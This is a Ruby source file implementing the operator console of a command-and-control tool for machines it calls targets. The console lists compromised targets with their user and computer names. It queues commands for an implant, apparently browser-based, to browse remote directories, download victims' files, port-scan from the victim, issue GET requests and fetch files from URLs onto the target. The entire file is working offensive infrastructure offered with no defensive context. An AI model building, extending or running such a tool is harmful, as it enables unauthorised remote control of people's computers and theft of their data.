# frozen_string_literal: true

require('tty')
require('nokogiri')

# Command and Control
module CommandControl
  # CLI
  class CLI
    private

    TARGETS_HEADER = %w[target_status session_id remote_address computer_name user_name platform_name last_seen].freeze
    TARGET_TREE = %w[type name size date_modified].freeze

    attr_reader(:data_directory, :c2_scripting, :tty_prompt, :targets_list)

    def ask_target
      session_id = tty_prompt.ask('Enter the target <session_id> :') do |ask|
        ask.convert(:int)
        ask.validate ->(input) { input.match?(/^\d+$/) && (1..targets_list.size).include?(input.to_i) }
        ask.messages[:valid?] = 'Please choose a valid <session_id>.'
      end
      session_id -= 1
      targets_list[session_id]
    end

    def ask_command(target_session)
      loop do
        target_command = tty_prompt.ask("\u{1F4BB} #{target_session['user_name']}@#{target_session['computer_name']}:~$") do |ask|
          ask.required(true)
          ask.messages[:required?] = 'Type the (h)elp command, then press [Enter] to get help.'
        end
        case target_command
        when 'h', 'help'
          show_help
        when 'c', 'clear'
          clear_session
        when 'i', 'info'
          target_json = c2_scripting.load_target(target_session)
          show_info(target_session, target_json)
        when 't', 'tree'
          show_tree(target_session)
        when %r{\A(?:a|access) (https?://\S+)\z}
          target_tmp = c2_scripting.access_url(target_session, Regexp.last_match[1])
          wait_command(target_tmp)
        when %r{\A(?:b|browse) (/?.*/)\z}
          target_tmp = c2_scripting.browse_directory(target_session, Regexp.last_match[1])
          wait_command(target_tmp)
        when %r{\A(?:d|download) (/.*[^/])\z}
          target_tmp = c2_scripting.download_file(target_session, Regexp.last_match[1])
          wait_command(target_tmp)
        when %r{\A(?:s|scan) (?!/|http)([a-z0-9.-]+)\z}
          target_tmp = c2_scripting.scan_address(target_session, Regexp.last_match[1])
          wait_command(target_tmp)
        when %r{\A(?:u|upload) (https?://.*[^/])\z}
          target_tmp = c2_scripting.upload_url(target_session, Regexp.last_match[1])
          wait_command(target_tmp)
        when 'q', 'quit'
          break
        else
          puts("\u{274C} Command not recognized, malformed or incomplete.")
        end
      end
    end

    def show_help
      puts <<~HELP
        (h)elp                     - Show this help message
        (c)lear                    - Clear this session screen
        (i)nfo                     - Show the general information of the target
        (t)ree                     - Show the directory and file structure of the target
        (a)ccess <url>             - Send a GET request to the specified URL*
        (b)rowse <directory>       - Browse the specified remote directory*
        (d)ownload <file>          - Download the specified remote file*
        (s)can <address>           - Port discovery on the specified address*
        (u)pload <url>             - Upload the file hosted at the specified remote URL
        (q)uit                     - Quit the program

        * The returned data is stored in #{@data_directory}/<ADDRESS>/<HOSTNAME>/.
      HELP
    end

    def clear_session
      system('clear')
    end

    def show_info(target_session, target_json)
      puts <<~INFO
        session_id:                #{target_session['session_id']}
        remote_address:            #{target_session['remote_address']}
        computer_name:             #{target_session['computer_name']}
        user_name:                 #{target_session['user_name']}
        platform_name:             #{target_session['platform_name']}
        user_agent:                #{target_json ? target_json['user_agent'] : 'Not available'}
        last_seen:                 #{target_json ? Time.at(target_json['last_seen']).strftime('%m/%d/%Y %I:%M:%S %p') : 'Not available'}
      INFO
    end

    def show_tree(target_session)
      target_tree = c2_scripting.load_tree(target_session)
      tty_table = TTY::Table.new(
        header: TARGET_TREE,
        rows: !target_tree.empty? ? target_tree : [Array.new(TARGET_TREE.size)]
      )
      puts(tty_table.render(:unicode, alignments: %i[center left left left], padding: [0, 1]))
    end

    def wait_command(target_tmp)
      return false unless target_tmp

      begin
        tty_spinner = TTY::Spinner.new('{:spinner}', format: :dots)
        tty_spinner.auto_spin
        Timeout.timeout(15) do
          sleep(1) while File.exist?(target_tmp)
        end
        tty_spinner.stop('The command has been distributed and is being processed.')
      rescue Timeout::Error
        tty_spinner.stop('The target no longer seems to be available.')
      end
      true
    end

    public

    def initialize(data_directory)
      @c2_scripting = Scripting.new(data_directory)
      @data_directory = data_directory
      @tty_prompt = TTY::Prompt.new
    end

    def show_banner; end

    def show_targets
      refresh_targets = true
      trap('SIGINT') do
        print("\r")
        refresh_targets = false
      end
      while refresh_targets
        system('clear')
        @targets_list = c2_scripting.load_targets
        tty_table = TTY::Table.new(
          header: TARGETS_HEADER,
          rows: !targets_list.empty? ? targets_list : [Array.new(TARGETS_HEADER.size)]
        )
        puts(
          tty_table.render(:ascii, alignment: [:center], padding: [0, 1], resize: true) do |render|
            render.border.separator = ->(row) { ((row + 1) % 1).zero? }
          end
        )
        puts('Press [CTRL+C] to stop the automatic refresh of targets.')
        sleep(4)
      end
    end

    def show_actions
      loop do
        tty_prompt.select('Which action would you like to perform ?') do |select|
          select.choice("\u{1F504} Automatically refresh the list of targets", -> { show_targets })
          unless targets_list.empty?
            select.choice("\u{1F50C} Control a single target", lambda {
              target_session = ask_target
              ask_command(target_session)
            })
          end
          select.choice("\u{1F44B} Exit the program", -> { exit })
        end
      end
    end
  end

  # Scripting
  class Scripting
    private

    attr_reader(:data_directory)

    def load_command(target_session, target_command)
      target_directory = "#{data_directory}/#{target_session['remote_address']}/#{target_session['computer_name']}"
      target_tmp = "#{target_directory}/data.tmp"
      return false if !File.exist?(target_directory) || File.exist?(target_tmp)

      data_tmp = File.open(target_tmp, 'w')
      data_tmp.write(target_command)
      data_tmp.close
      target_tmp
    end

    public

    def initialize(data_directory)
      @data_directory = data_directory
    end

    def load_targets
      targets_list = []
      session_id = 1
      Dir.glob("#{data_directory}/*/*/data.json").each do |data_json|
        data_json = JSON.parse(File.read(data_json))
        data_json.replace({ 'session_id' => session_id }.merge(data_json))
        data_json.replace({ 'target_status' => (Time.now.to_i - data_json['last_seen']).abs <= 6 ? "\u{1F7E2}" : "\u{1F534}" }.merge(data_json))
        data_json.delete('user_agent')
        data_json['last_seen'] = Time.at(data_json['last_seen']).strftime('%m/%d/%Y %I:%M:%S %p')
        targets_list.push(data_json)
        session_id += 1
      end
      targets_list
    end

    def load_target(target_session)
      data_json = "#{data_directory}/#{target_session['remote_address']}/#{target_session['computer_name']}/data.json"
      return false unless File.exist?(data_json)

      JSON.parse(File.read(data_json))
    end

    def load_tree(target_session)
      data_html = "#{data_directory}/#{target_session['remote_address']}/#{target_session['computer_name']}/data.html"
      return [] unless File.exist?(data_html)

      target_tree = []
      Nokogiri::HTML(File.read(data_html)).css('tbody tr').each do |tbody_tr|
        td_details = tbody_tr.css('td.detailsColumn[data-value]')
        td_size = td_details.first&.text
        td_type = td_size.empty? ? "\u{1F4C1}" : "\u{1F4C4}"
        target_tree.push([td_type, tbody_tr.at('td a.icon')['href'], td_size, td_details.last&.text])
      end
      target_tree
    end

    def access_url(target_session, destination_url)
      load_command(target_session, "{\"access_url\":\"#{destination_url}\"}")
    end

    def browse_directory(target_session, source_directory)
      load_command(target_session, "{\"browse_directory\":\"#{source_directory}\"}")
    end

    def download_file(target_session, source_file)
      load_command(target_session, "{\"download_file\":\"#{source_file}\"}")
    end

    def scan_address(target_session, destination_address)
      load_command(target_session, "{\"scan_address\":\"#{destination_address}\"}")
    end

    def upload_url(target_session, source_url)
      load_command(target_session, "{\"upload_url\":\"#{source_url}\"}")
    end
  end
end
